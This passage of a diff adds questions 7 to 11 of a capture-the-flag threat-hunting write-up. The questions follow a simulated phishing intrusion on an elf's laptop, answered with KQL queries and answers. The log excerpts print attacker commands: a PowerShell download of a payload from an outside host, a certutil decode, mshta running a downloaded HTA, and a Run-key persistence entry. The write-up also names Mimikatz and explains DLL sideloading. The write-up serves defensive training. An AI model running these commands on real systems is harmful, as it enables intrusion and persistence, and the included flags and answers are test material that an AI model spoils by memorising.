+"process_hash": acb984e77fe41893cc10827bb8c5f4d97632b9fc76b33748e947183caa48919a,
+"hostname": WebApp-ElvesWorkshop,
+"username": seadmin
+```
+
+```txt
+Invoke-Mimikatz.ps1
+```
 
 ### Question 7
 
+Okay back to Noel, after downloading the file, Noel Boetie followed the instructions in the email and ran it, but mentioned that nothing appeared to happen.
+
+Since the email came from an internal source, Noel assumed it was safe - yet this may have been the moment the unknown threat actor silently gained access. We need to identify exactly when Noel executed the file to trace the beginning of the attack.
+
+Eve Snowshoes, "It’s easy to see why Noel thought the email was harmless - it came from an internal account. But attackers often use compromised internal sources to make their phishing attempts more believable."
+
+What is the timestamp where Noel executed the file?
+
+```sql
+ProcessEvents
+| where hostname == "Elf-Lap-A-Boetie"
+| where timestamp between (date("2024-12-12T14:48:55.000Z") .. datetime("2024-12-12T16:48:55.000Z"))
+```
+
+```json
+"parent_process_hash": 00e563ac10db418d26a5e2bf2abbf80bfc4f7e9f4865a72dfe9ec59d26620f25,
+"process_commandline": Explorer.exe "C:\Users\noboetie\Downloads\echo.exe",
+"process_name": Explorer.exe,
+"process_hash": dfa249867546156557f09b322999cad4f628246adca45f36f5bbe106bf6c3b73,
+"hostname": Elf-Lap-A-Boetie,
+"username": noboetie
+```
+
+```txt
+2024-12-12T15:14:38Z
+```
+
 ### Question 8
+
+After Noel ran the file, strange activity began on the system, including the download of a file called holidaycandy.hta. Keep in mind that attackers often use multiple domains to host different pieces of malware.
+
+Eve explains, "Attackers frequently spread their operations across several domains to evade detection."
+
+What domain was the holidaycandy.hta file downloaded from?
+
+```sql
+ProcessEvents
+| where hostname == "Elf-Lap-A-Boetie"
+| where timestamp between (date("2024-12-12T14:48:55.000Z") .. datetime("2024-12-12T16:48:55.000Z"))
+```
+
+```json
+"timestamp": 2024-12-12T15:39:25.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": mshta.exe "C:\\Windows\\Temp\\holidaycandy.hta",
+"process_name": mshta.exe,
+"process_hash": 11e760b06f463291a36b6aa3a09bb09182348397ac829da6f99bd4f56111e27f,
+"hostname": Elf-Lap-A-Boetie,
+"username": noboetie
+```
+
+```sql
+OutboundNetworkEvents
+| where url contains "holidaycandy"
+```
+
+```json
+"timestamp": 2024-12-12T15:39:25.000Z,
+"method": GET,
+"src_ip": 10.10.0.9,
+"user_agent": Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36,
+"url": http://compromisedchristmastoys.com/holidaycandy.hta
+```
+
+```txt
+compromisedchristmastoys.com
+```
 
 ### Question 9
 
+An interesting series of events has occurred: the attacker downloaded a copy of frosty.txt, decoded it into a zip file, and used tar to extract the contents of frosty.zip into the Tasks directory.
+
+This suggests the possibility that additional payloads or tools were delivered to Noel’s laptop. We need to investigate if any additional files appeared after this sequence.
+
+Eve Snowshoes, "When an attacker drops files like this, it’s often the prelude to more malicious actions. Let’s see if we can find out what else landed on Noel’s laptop."
+
+Did any additional files end up on Noel’s laptop after the attacker extracted frosty.zip?
+
+what was the first file that was created after extraction?
+
+
+```sql
+ProcessEvents
+| where hostname == "Elf-Lap-A-Boetie"
+```
+
+```json
+"timestamp": 2024-12-24T17:18:45.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": Invoke-WebRequest -Uri "http://holidaybargainhunt.io:8080/frosty.txt" -OutFile "C:\\Windows\\Tasks\\frosty.txt"; certutil -decode "C:\\Windows\\Tasks\\frosty.txt" "C:\\Windows\\Tasks\\frosty.zip",
+"process_name": powershell.exe,
+"process_hash": 6414c0cd16bb83f18cd286d5049071b5a8d35cd975c51606eeff77a244a11bda,
+"hostname": Elf-Lap-A-Boetie,
+"username": noboetie`
+```
+
+```json
+"timestamp": 2024-12-24T17:19:45.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": tar -xf C:\\Windows\\Tasks\\frosty.zip -C C:\\Windows\\Tasks\\,
+"process_name": tar.exe,
+"process_hash": 3bd4e242cd32440912efa5769b6aee923d95f99a93182668d2a781cb72e2b4a2,
+"hostname": Elf-Lap-A-Boetie,
+"username": noboetie
+```
+
+```json
+"timestamp": 2024-12-24T18:40:36.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MS SQL Writer" -Force | New-ItemProperty -Name "frosty" -Value "C:\Windows\Tasks\sqlwriter.exe" -PropertyType String -Force,
+"process_name": powershell.exe,
+"process_hash": b2bdf6438ab4329448e06b53f5acbbaa28f19c5d1f7d4107a1292c0366eed643,
+"hostname": Elf-Lap-A-Boetie,
+"username": noboetie
+```
+
+```txt
+sqlwriter.exe
+```
+
 ### Question 10
 
+In the previous question, we discovered that two files, sqlwriter.exe and frost.dll, were downloaded onto Noel’s laptop. Immediately after, a registry key was added that ensures sqlwriter.exe will run every time Noel’s computer boots.
+
+This persistence mechanism indicates the attacker’s intent to maintain long-term control over the system.
+
+Eve Snowshoes, "Adding a registry key for persistence is a classic move by attackers to ensure their malicious software runs automatically. It’s crucial to understand how this persistence is set up to prevent further damage."
+
+What is the name of the property assigned to the new registry key?
+
+```sql
+ProcessEvents
+| where hostname == "Elf-Lap-A-Boetie"
+```
+
+```json
+"timestamp": 2024-12-24T18:40:36.000Z,
+"parent_process_name": cmd.exe,
+"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
+"process_commandline": New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MS SQL Writer" -Force | New-ItemProperty -Name "frosty" -Value "C:\Windows\Tasks\sqlwriter.exe" -PropertyType String -Force,
+"process_name": powershell.exe,
+"process_hash": b2bdf6438ab4329448e06b53f5acbbaa28f19c5d1f7d4107a1292c0366eed643,
+"hostname": Elf-Lap-A-Boetie,
+"username": noboetie
+```
+
+```txt
+frosty
+```
+
 ### Question 11
+
+Congratulations! You've successfully identified the threat actor's tactics. The attacker gained access to WebApp-ElvesWorkshop from the IP address 182.56.23.122, dumped credentials, and used those to send phishing emails internally to Noel.
+
+The malware family they used is called Wineloader, which employs a technique known as DLL sideloading. This technique works by placing a malicious DLL in the same directory as a legitimate executable (in this case, sqlwriter.exe).
+
+When Windows tries to load a referenced DLL without a full path, it checks the executable's current directory first, causing the malicious DLL to load automatically. Additionally, the attacker created a scheduled task to ensure sqlwriter.exe runs on system boot, allowing the malicious DLL to maintain persistence on the system.
+
+To obtain your FINAL flag use the KQL below with your last answer!
+
+```sql
+let finalflag = "Change This!";
+let base64_encoded = base64_encode_tostring(finalflag);
+print base64_encoded
+```
+
+```sql
+let finalflag = "frosty";
+let base64_encoded = base64_encode_tostring(finalflag);
+print base64_encoded
+```
+
+```txt
+ZnJvc3R5
+```
 
 ## Act II Conclusion
 
